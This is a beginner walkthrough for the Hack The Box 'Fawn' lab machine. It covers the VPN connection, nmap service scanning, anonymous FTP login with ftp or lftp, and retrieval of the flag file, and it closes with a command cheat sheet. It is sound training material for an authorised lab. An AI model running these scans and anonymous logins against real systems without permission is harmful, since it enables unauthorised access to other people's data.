# 🦌 Fawn - Hack The Box Walkthrough

## 1. Connection

Before you can interact with the machine, you must establish a secure
tunnel to the Hack The Box network using OpenVPN.

### Prerequisites:

-   You must have **openvpn** installed (e.g.,
    `sudo apt install openvpn`).
-   You must have downloaded your **VPN configuration file** from the
    *"Connect to HTB" \> "Starting Point"* menu.

### Steps:

1.  Open your terminal.
2.  Navigate to the folder where your `.ovpn` file is located.
3.  Run the connection command:

``` bash
sudo openvpn your_file_name.ovpn
```

**Check:**\
Wait for the log to say **Initialization Sequence Completed**.\
Keep this terminal window open; closing it will drop the connection.

------------------------------------------------------------------------

## 2. Reconnaissance 

Once connected, identify the IP address of the Fawn machine (displayed
on the HTB page) and scan it for vulnerabilities.

### Check Connectivity:

``` bash
ping -c 4 <TARGET_IP>
```

### Scan for Open Ports:

Use Nmap to find which services are running.\
The `-sV` flag attempts to detect the service version.

``` bash
nmap -sV <TARGET_IP>
```

**Expected Result:**\
Port **21** will appear open, running **FTP (File Transfer Protocol)**.

------------------------------------------------------------------------

## 3. Exploitation 

The scan reveals an FTP server. A common misconfiguration is allowing
**Anonymous login**, meaning users can connect without valid
credentials.

### Connect to the FTP Server:

``` bash
ftp <TARGET_IP>
```

### Login Process:

-   **Name:** `anonymous`\
-   **Password:** *(Leave blank and press ENTER)*

If it works, you'll see:

    230 Login successful.

**Method B: Using lftp (Recommended)**

`lftp` is a more advanced client that supports FTP, SFTP, and HTTP. It features command history and tab completion, making it easier to use than standard ftp

1. Install (if missing)
```bash
sudo apt install lftp
```
2. Connect as Anonymous
``` bash
lftp -u anonymous, <TARGET_IP>
```

------------------------------------------------------------------------

## 4. Retrieving the Flag 

Now that you have FTP access, retrieve the flag.

### List Files:

``` bash
ls
```

You should see **flag.txt**.

### Download the Flag:

``` bash
get flag.txt
```

### Exit:

``` bash
exit
```

### Read the Flag:

Back in your local terminal:

``` bash
cat flag.txt
```

Copy the code starting with `HTB{...}` and submit it on the website.

---
## ⚡ Important Commands Cheat Sheet

| Command                    | Description                                   |
|---------------------------|-----------------------------------------------|
| `sudo openvpn <file.ovpn>` | Connects your VM to the Hack The Box labs.    |
| `ping <IP>`               | Checks connectivity to the target machine.     |
| `nmap -sV <IP>`           | Scans for open ports and service versions.     |
| `ftp <IP>`                | Connects to the FTP service.                   |
| `get <filename>`          | Downloads a file from the FTP server.          |
| `cat <filename>`          | Prints a file's content to screen.             |

---
